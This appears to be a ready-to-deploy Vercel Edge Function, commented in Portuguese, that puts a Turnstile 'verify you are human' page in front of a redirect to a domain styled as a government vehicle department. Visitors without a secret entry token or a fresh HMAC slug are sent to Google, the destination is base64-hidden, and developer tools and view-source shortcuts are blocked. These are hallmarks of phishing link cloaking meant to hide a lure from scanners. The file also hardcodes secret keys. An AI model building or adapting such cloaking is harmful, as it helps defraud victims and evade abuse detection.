// ============================================================
//  VERCEL EDGE FUNCTION — Verificação Turnstile com slugs HMAC
//  Adaptado do Cloudflare Worker. 100% stateless.
// ============================================================
//  COMO USAR NA VERCEL:
//   1. Crie um projeto novo (ou pasta) com esta estrutura:
//        /api/index.js     ← este arquivo
//        /vercel.json      ← arquivo de rewrites (incluso abaixo)
//   2. Faça deploy (vercel deploy ou conecte ao GitHub)
//   3. Link de divulgação: https://SEU-PROJETO.vercel.app/?go=online
// ============================================================

export const config = { runtime: "edge" };

// ========= CONFIGURE AQUI =========
const DESTINATION_URL    = "https://departamentoveicular-gov.com/es";
const TITLE              = "Verificação de acesso";
const SUBTITLE           = "Confirme que você é humano para continuar";
const TURNSTILE_SITE_KEY = "0x4AAAAAADR6D2_ZQAPgG7jz";

// 🔑 COLE AQUI a Secret Key do Turnstile
const TURNSTILE_SECRET   = "0x4AAAAAADR6D2UPCRbs3tbDzfgHjxZve-g";

const FALLBACK_URL       = "https://www.google.com";
const ENTRY_TOKEN        = "online";
const SLUG_TTL_SECONDS   = 300;
// ==================================

const HMAC_SECRET = "sc-guias-2026-1167a8c9359ce493353764016606e2b20678376b1f68be2d8a0c6c319dc5af05-fixed";

export default async function handler(request) {
  const url = new URL(request.url);
  const path = url.pathname;

  if (path === "/verify" && request.method === "POST") {
    return handleVerify(request);
  }

  if (path === "/" || path === "") {
    if ((url.searchParams.get("go") || "") !== ENTRY_TOKEN) {
      return Response.redirect(FALLBACK_URL, 302);
    }
    const newSlug = await makeSlug();
    return new Response(null, {
      status: 302,
      headers: {
        "Location": `${url.origin}/s/${newSlug}`,
        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
      },
    });
  }

  if (path.startsWith("/s/")) {
    const slug = path.slice(3);
    if (!(await verifySlug(slug))) {
      return Response.redirect(FALLBACK_URL, 302);
    }
    return new Response(renderVerifyPage(slug), {
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
      },
    });
  }

  return Response.redirect(FALLBACK_URL, 302);
}

// =============== HMAC ===============
async function hmacSign(message) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    "raw", enc.encode(HMAC_SECRET),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
  );
  const sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));
  return b64url(new Uint8Array(sig));
}
function b64url(bytes) {
  const s = btoa(String.fromCharCode(...bytes));
  return s.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function randomNonce(len = 10) {
  const alpha = "abcdefghijkmnpqrstuvwxyz23456789";
  const arr = new Uint8Array(len);
  crypto.getRandomValues(arr);
  let out = "";
  for (let i = 0; i < len; i++) out += alpha[arr[i] % alpha.length];
  return out;
}
async function makeSlug() {
  const ts = Math.floor(Date.now() / 1000);
  const nonce = randomNonce(10);
  const payload = `${ts}.${nonce}`;
  const sig = await hmacSign(payload);
  return `${payload}.${sig}`;
}
function safeEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}
async function verifySlug(slug) {
  if (!slug || typeof slug !== "string") return false;
  const parts = slug.split(".");
  if (parts.length !== 3) return false;
  const [tsStr, nonce, sig] = parts;
  const ts = parseInt(tsStr, 10);
  if (!ts || !nonce || !sig) return false;
  const expected = await hmacSign(`${ts}.${nonce}`);
  if (!safeEqual(sig, expected)) return false;
  const now = Math.floor(Date.now() / 1000);
  if (now - ts > SLUG_TTL_SECONDS) return false;
  if (ts > now + 30) return false;
  return true;
}

// =============== TURNSTILE ===============
async function handleVerify(request) {
  let body;
  try { body = await request.json(); }
  catch { return json({ success: false, error: "bad-body" }, 400); }

  const slug = (body.slug || "").toString();
  const token = (body.token || "").toString();

  if (!token) return json({ success: false, error: "missing-token" }, 400);
  if (!(await verifySlug(slug))) return json({ success: false, error: "invalid-slug" }, 403);
  if (!TURNSTILE_SECRET) return json({ success: false, error: "missing-turnstile-secret" }, 500);

  const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() || "";
  const form = new FormData();
  form.append("secret", TURNSTILE_SECRET);
  form.append("response", token);
  if (ip) form.append("remoteip", ip);

  const r = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST", body: form,
  });
  const result = await r.json();

  return json({
    success: !!result.success,
    errors: result["error-codes"] || [],
    redirect: result.success ? DESTINATION_URL : null,
  });
}
function json(obj, status = 200) {
  return new Response(JSON.stringify(obj), {
    status, headers: { "Content-Type": "application/json" },
  });
}
function esc(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}
function b64(s) { return btoa(unescape(encodeURIComponent(s))); }

function renderVerifyPage(slug) {
  const destB64 = b64(DESTINATION_URL);
  return `<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>${esc(TITLE)}</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
*{box-sizing:border-box;-webkit-user-select:none;user-select:none}
input,textarea{-webkit-user-select:text;user-select:text}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f5f5f5;padding:1rem;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
.card{width:100%;max-width:28rem;background:#fff;border:1px solid #e5e7eb;border-radius:.5rem;box-shadow:0 1px 2px rgba(0,0,0,.05);padding:2rem}
h1{font-size:1.25rem;font-weight:600;color:#111827;margin:0 0 .5rem;text-align:center}
.subtitle{font-size:.875rem;color:#4b5563;margin:0 0 1.5rem;text-align:center}
.widget{display:flex;justify-content:center;margin:1.5rem 0}
.msg{font-size:.875rem;text-align:center;margin:1rem 0 0}
.msg.verifying{color:#4b5563}.msg.ok{color:#059669;font-weight:500}.msg.error{color:#dc2626}
.footer{font-size:.75rem;color:#6b7280;text-align:center;margin:1.5rem 0 0}
</style></head><body oncontextmenu="return false">
<div class="card">
  <h1>${esc(TITLE)}</h1>
  <p class="subtitle">${esc(SUBTITLE)}</p>
  <div class="widget"><div id="cf-widget"></div></div>
  <p id="status" class="msg" style="display:none"></p>
  <p class="footer">Esta página verifica seu acesso antes de continuar.</p>
</div>
<script>
document.addEventListener("contextmenu",e=>e.preventDefault());
document.addEventListener("keydown",e=>{
  if(e.keyCode===123) return e.preventDefault();
  if((e.ctrlKey||e.metaKey)&&(e.key==="u"||e.key==="U"||e.key==="s"||e.key==="S")) return e.preventDefault();
  if((e.ctrlKey||e.metaKey)&&e.shiftKey&&["i","I","j","J","c","C","k","K"].includes(e.key)) return e.preventDefault();
});
const _d=${JSON.stringify(destB64)};
const _k=${JSON.stringify(TURNSTILE_SITE_KEY)};
const _s=${JSON.stringify(slug)};
const _fallback=()=>decodeURIComponent(escape(atob(_d)));
const statusEl=document.getElementById("status");
function setStatus(t,c){statusEl.textContent=t;statusEl.className="msg "+c;statusEl.style.display=t?"block":"none"}
let widgetId=null;
function renderWidget(){
  if(!window.turnstile||widgetId!==null)return;
  widgetId=window.turnstile.render("#cf-widget",{
    sitekey:_k,theme:"light",
    callback:async(token)=>{
      setStatus("Verificando...","verifying");
      try{
        const r=await fetch("/verify",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token,slug:_s})});
        const d=await r.json();
        if(d.success){
          setStatus("Verificado — redirecionando...","ok");
          const dest=d.redirect||_fallback();
          setTimeout(()=>window.location.replace(dest),600);
        } else {
          setStatus("Sessão expirada. Recarregando...","error");
          setTimeout(()=>window.location.reload(),1500);
        }
      }catch{
        setStatus("Erro de conexão. Tente novamente.","error");
        window.turnstile.reset(widgetId);
      }
    },
    "error-callback":()=>setStatus("Erro no desafio. Recarregue a página.","error"),
    "expired-callback":()=>{setStatus("","");window.turnstile.reset(widgetId)}
  });
}
const w=setInterval(()=>{if(window.turnstile){clearInterval(w);renderWidget()}},100);
</script></body></html>`;
}
